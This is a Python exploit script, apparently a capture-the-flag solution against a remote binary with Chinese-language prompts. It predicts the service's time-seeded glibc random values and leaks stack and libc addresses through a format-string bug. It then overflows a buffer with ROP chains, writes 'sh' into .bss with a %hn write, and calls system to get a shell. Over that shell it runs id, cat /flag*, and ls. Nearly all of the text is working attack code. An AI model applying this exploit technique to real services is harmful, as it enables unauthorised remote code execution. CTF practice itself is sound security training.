import time, re, struct
from lib78 import *
from lib78 import ONE_WAY
from elfsym import ELF

LIBC_PATH = 'libc_cache/libc6_2.39-0ubuntu8.8_amd64.so'
_e = ELF(LIBC_PATH)
_s = _e.symbols()
OFF_PUTS = _s['puts']
OFF_SYSTEM = _s['system']
OFF_MAIN_RET = 0x2a1ca
OFF_POP_RDI = 0x10c08d
BSS_SH = 0x4048          # .bss 尾部空闲槽（三个 FILE* 之后的零填充）

CMDS = [b'echo MARK\n', b'id\n', b'cat /flag* 2>/dev/null\n', b'cat /home/*/flag* 2>/dev/null\n',
        b'ls -la / 2>/dev/null\n', b'ls -la . 2>/dev/null\n']


def align_send(c, data, lo=0.06, hi=0.28):
    while True:
        t = time.time()
        if lo <= (t % 1) <= hi:
            c.send(data)
            return t
        time.sleep(0.006)


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)


def attempt(v=False):
    c = Conn()
    try:
        c.s.settimeout(3)
        buf = b''
        while buf.count(b'\n') < 2:
            d = c.s.recv(1)
            if not d:
                return None
            buf += d
        T = time.time()
        c.buf = b''
        c.send(str(GlibcRand(int(T - ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('说出你想要说的话吧'.encode())
        if not ok:
            return None
        t1 = align_send(c, b'%15$p.%17$p\n')
        out, ok = c.read_until('如果只是许愿'.encode())
        m = re.findall(rb'0x[0-9a-f]+', out)
        if len(m) < 2:
            return None
        base = int(m[0], 16) - OFF_RET_MAIN
        libc_ret = int(m[1], 16)
        c.read_until('做你想要做的事吧'.encode())
        c.send(str(GlibcRand(int(t1 + ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('做你想要做的事吧'.encode())
        if not ok:
            return None

        # 轮1: 泄漏 puts
        chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + 0x1428]
        c.send(b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain1))
        time.sleep(0.2)
        c.send(fmt_addr('%6$s', base + OFF_PUTS_GOT))
        time.sleep(0.7); c.pull(0.6)
        raw = c.buf
        off = 2 if raw[:2] == b':\n' else 0
        if len(raw) < off + 6:
            return None
        puts_addr = int.from_bytes(raw[off:off + 6], 'little')
        c.buf = raw[off + 6:]
        if not (0x700000000000 < puts_addr < 0x800000000000):
            return None
        lb = libc_ret - OFF_MAIN_RET
        if lb + OFF_PUTS != puts_addr:
            if v:
                print('  libc mismatch')
            return None
        system = lb + OFF_SYSTEM

        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        if not ok:
            return None
        c.send(b'1\n')
        time.sleep(0.6); c.pull(0.5); c.buf = b''

        # 轮2: eL 把 "sh" 写进 bss（chain[4] 作为目标地址槽）
        chain2 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + 0x1428, base + BSS_SH]
        c.send(b'C' * 0x40 + p64(0) + b''.join(p64(x) for x in chain2))
        time.sleep(0.25)
        c.send(b'%26739c%17$hn')
        time.sleep(0.9); c.pull(0.5)
        if v:
            print('  after write:', c.buf[-16:])
        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        c.send(b'1\n')
        time.sleep(0.6); c.pull(0.5); c.buf = b''
        if not ok:
            return None
        # 轮3: ROP system(bss)
        chain3 = [base + OFF_RET, lb + OFF_POP_RDI, base + BSS_SH, system]
        c.send(b'D' * 0x40 + p64(0) + b''.join(p64(x) for x in chain3))
        time.sleep(0.9); c.pull(0.5)
        if v:
            print('  rop3:', c.buf[:20])
        c.buf = b''
        for cmd in CMDS:
            c.send(cmd)
            time.sleep(0.4)
        time.sleep(1.0); c.pull(1.5)
        return c.buf
    finally:
        c.close()


if __name__ == '__main__':
    for i in range(30):
        try:
            r = attempt(v=True)
        except Exception as e:
            continue
        txt = (r or b'').decode('utf-8', 'replace')
        if txt.strip():
            print('try %d: %s' % (i, txt[:300].replace('\n', ' | ')))
        if 'HTUCTF' in txt or 'flag{' in txt:
            open('flag.txt', 'w').write(txt)
            print('*** FLAG ***')
            break
